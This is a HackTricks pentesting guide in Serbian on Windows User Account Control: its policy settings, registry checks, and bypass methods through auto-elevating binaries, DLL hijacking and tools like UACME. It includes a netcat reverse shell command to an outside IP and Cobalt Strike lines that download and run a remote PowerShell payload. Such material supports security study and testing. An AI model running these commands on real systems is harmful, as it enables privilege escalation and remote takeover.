# UAC - Kontrola korisničkog naloga

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomoć najnaprednijih alata zajednice.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[Kontrola korisničkog naloga (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) je funkcija koja omogućava **zahtev za odobrenje za povišene aktivnosti**. Aplikacije imaju različite `integritet` nivoe, a program sa **visokim nivoom** može izvršavati zadatke koji **potencijalno mogu ugroziti sistem**. Kada je UAC omogućen, aplikacije i zadaci uvek **pokreću se pod sigurnosnim kontekstom naloga koji nije administrator**, osim ako administrator eksplicitno odobri da ove aplikacije/zadaci imaju administratorski pristup sistemu. To je funkcija koja štiti administratore od nenamernih promena, ali se ne smatra sigurnosnom granicom.

Za više informacija o nivoima integriteta:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Kada je UAC na snazi, administratoru je dodeljeno 2 tokena: standardni korisnički ključ, za obavljanje redovnih radnji kao običan korisnik, i jedan sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno opisuje kako UAC funkcioniše i uključuje proces prijavljivanja, korisničko iskustvo i arhitekturu UAC-a. Administratori mogu koristiti sigurnosne politike da konfigurišu kako UAC funkcioniše specifično za svoju organizaciju na lokalnom nivou (korišćenjem secpol.msc), ili konfigurisati i distribuirati putem Group Policy Objects (GPO) u okruženju Active Directory domena. Različite postavke su detaljno opisane [ovde](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoji 10 Group Policy postavki koje se mogu konfigurisati za UAC. Sledeća tabela pruža dodatne detalje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |
### Teorija zaobilaženja UAC-a

Neke programe **automatski podiže** na **viši nivo** ako **korisnik pripada** grupi **administratora**. Ovi izvršni fajlovi imaju unutar svog _**Manifesta**_ opciju _**autoElevate**_ sa vrednošću _**True**_. Izvršni fajl takođe mora biti **potpisan od strane Microsofta**.

Zatim, da bi se **zaobišao** UAC (podizanje sa **srednjeg** nivoa integriteta na **visoki**), neki napadači koriste ove vrste izvršnih fajlova da bi **izvršili proizvoljni kod**, jer će biti izvršeni iz procesa sa **visokim nivoom integriteta**.

Možete **proveriti** _**Manifest**_ izvršnog fajla koristeći alat _**sigcheck.exe**_ iz Sysinternals-a. A nivo integriteta procesa možete **videti** koristeći _Process Explorer_ ili _Process Monitor_ (iz Sysinternals-a).

### Provera UAC-a

Da biste potvrdili da li je UAC omogućen, uradite sledeće:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ako je **`1`**, onda je UAC **aktiviran**, ako je **`0`** ili **ne postoji**, onda je UAC **neaktivan**.

Zatim, proverite **koji nivo** je konfigurisan:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Ako je **`0`**, UAC neće tražiti potvrdu (kao **onemogućeno**)
* Ako je **`1`**, administratoru se traži korisničko ime i lozinka da bi izvršio binarnu datoteku s visokim privilegijama (na sigurnom radnom okruženju)
* Ako je **`2`** (**Uvek me obaveštavaj**), UAC će uvek tražiti potvrdu od administratora kada pokuša da izvrši nešto s visokim privilegijama (na sigurnom radnom okruženju)
* Ako je **`3`**, slično kao `1`, ali nije neophodno na sigurnom radnom okruženju
* Ako je **`4`**, slično kao `2`, ali nije neophodno na sigurnom radnom okruženju
* Ako je **`5`** (**podrazumevano**), tražiće se od administratora potvrda za pokretanje ne-Windows binarnih datoteka s visokim privilegijama

Zatim, trebate proveriti vrednost ključa **`LocalAccountTokenFilterPolicy`**\
Ako je vrednost **`0`**, samo korisnik sa RID 500 (**ugrađeni Administrator**) može obavljati administrativne zadatke bez UAC-a, a ako je `1`, svi nalozi unutar grupe "Administratori" mogu to raditi.

Na kraju, pogledajte vrednost ključa **`FilterAdministratorToken`**\
Ako je **`0`** (podrazumevano), ugrađeni administratorski nalog može obavljati zadatke udaljene administracije, a ako je **`1`**, ugrađeni administratorski nalog ne može obavljati zadatke udaljene administracije, osim ako je `LocalAccountTokenFilterPolicy` postavljen na `1`.

#### Sažetak

* Ako `EnableLUA=0` ili **ne postoji**, nema UAC-a za bilo koga
* Ako `EnableLua=1` i **`LocalAccountTokenFilterPolicy=1`**, nema UAC-a za bilo koga
* Ako `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0`** i `FilterAdministratorToken=0`, nema UAC-a za RID 500 (ugrađeni Administrator)
* Ako `EnableLua=1` i **`LocalAccountTokenFilterPolicy=0`** i `FilterAdministratorToken=1`, UAC za sve

Sve ove informacije mogu se prikupiti pomoću metasploit modula: `post/windows/gather/win_privs`

Takođe možete proveriti grupe vašeg korisnika i dobiti nivo integriteta:
```
net user %username%
whoami /groups | findstr Level
```
## Bypassiranje UAC-a

{% hint style="info" %}
Napomena da ako imate grafički pristup žrtvi, zaobilazak UAC-a je jednostavan jer jednostavno možete kliknuti na "Da" kada se pojavi UAC upit.
{% endhint %}

Bypassiranje UAC-a je potrebno u sledećoj situaciji: **UAC je aktiviran, vaš proces se izvršava u kontekstu srednje integriteta, a vaš korisnik pripada grupi administratora**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je postavljen na najviši nivo sigurnosti (Uvek) nego ako je postavljen na bilo koji od drugih nivoa (Podrazumevano).**

### Onemogućen UAC

Ako je UAC već onemogućen (`ConsentPromptBehaviorAdmin` je **`0`**), možete **izvršiti reverzni shell sa administratorskim privilegijama** (nivo visoke integriteta) koristeći nešto poput:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC zaobilaženje sa duplikacijom tokena

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Veoma** osnovno UAC "zaobilaženje" (potpuni pristup sistemu datoteka)

Ako imate shell sa korisnikom koji je deo Administratorske grupe, možete **montirati C$** deljeni putem SMB (sistem datoteka) lokalno na novi disk i imaćete **pristup svemu unutar sistema datoteka** (čak i Administratorovu kućnu fasciklu).

{% hint style="warning" %}
**Izgleda da ovaj trik više ne funkcioniše**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC zaobilaženje pomoću Cobalt Strike-a

Tehnike Cobalt Strike-a će raditi samo ako UAC nije postavljen na najviši nivo sigurnosti.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **zaobilaženje** **UAC**-a.

### KRBUACBypass

Dokumentacija i alat dostupni na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC zaobilaženje eksploatacija

[**UACME**](https://github.com/hfiref0x/UACME) je **kompilacija** nekoliko eksploatacija za zaobilaženje UAC-a. Imajte na umu da ćete morati **kompajlirati UACME pomoću Visual Studio-a ili msbuild-a**. Kompilacija će stvoriti nekoliko izvršnih datoteka (poput `Source\Akagi\outout\x64\Debug\Akagi.exe`), trebat će vam znati **koju vam treba**.\
Treba **biti oprezan** jer neka zaobilaženja će **prikazati druge programe** koji će **upozoriti** korisnika da se nešto događa.

UACME ima **verziju iz koje je svaka tehnika počela raditi**. Možete pretražiti tehniku koja utječe na vaše verzije:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, koristeći [ovu](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) stranicu dobijate Windows verziju `1607` iz verzija izgradnje.

#### Više UAC zaobilaženja

**Sve** tehnike koje se koriste ovde za zaobilaženje UAC **zahtevaju** potpuno interaktivnu ljusku sa žrtvom (obična nc.exe ljuska nije dovoljna).

Možete dobiti koristeći **meterpreter** sesiju. Migrirajte na **proces** koji ima vrednost **Session** jednaku **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC zaobilaženje sa GUI

Ako imate pristup **GUI-ju, jednostavno prihvatite UAC upit** kada ga dobijete, zaista vam nije potrebno zaobilaženje. Dakle, pristup GUI-ju će vam omogućiti zaobilaženje UAC-a.

Osim toga, ako dobijete GUI sesiju koju je neko koristio (potencijalno putem RDP-a), postoje **neki alati koji će se pokretati kao administrator** odakle možete **pokrenuti** npr. **cmd** kao admin direktno bez ponovnog upita od strane UAC-a kao što je [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **skrivenije**.

### Buka brute-force UAC zaobilaženje

Ako vam nije važno da budete bučni, uvek možete **pokrenuti nešto poput** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) što **traži povećanje dozvola sve dok korisnik ne prihvati**.

### Vaše sopstveno zaobilaženje - Osnovna metodologija zaobilaženja UAC-a

Ako pogledate **UACME**, primetićete da **većina UAC zaobilaženja zloupotrebljava ranjivost Dll Hijacking** (uglavnom pisanje zlonamerne dll datoteke na _C:\Windows\System32_). [Pročitajte ovo da biste naučili kako pronaći ranjivost Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Pronađite binarni fajl koji će se **automatski povećati** (proverite da kada se izvrši, radi sa visokim nivoom integriteta).
2. Pomoću procmon-a pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati **napisati** DLL unutar nekih **zaštićenih putanja** (kao što je C:\Windows\System32) gde nemate dozvole za pisanje. To možete zaobići koristeći:
1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava izvlačenje sadržaja CAB fajla unutar zaštićenih putanja (jer se ovaj alat izvršava sa visokim nivoom integriteta).
2. **IFileOperation**: Windows 10.
4. Pripremite **skriptu** za kopiranje vašeg DLL-a unutar zaštićene putanje i izvršite ranjivi i automatski povećani binarni fajl.

### Još jedna tehnika zaobilaženja UAC-a

Sastoji se u praćenju da li se **autoElevated binarni fajl** pokušava **čitati** iz **registra** **ime/putanja** nekog **binarnog fajla** ili **komande** koja će biti **izvršena** (ovo je interesantnije ako binarni fajl traži ove informacije unutar **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** uz pomoć najnaprednijih alata zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **oglašavanje vaše kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
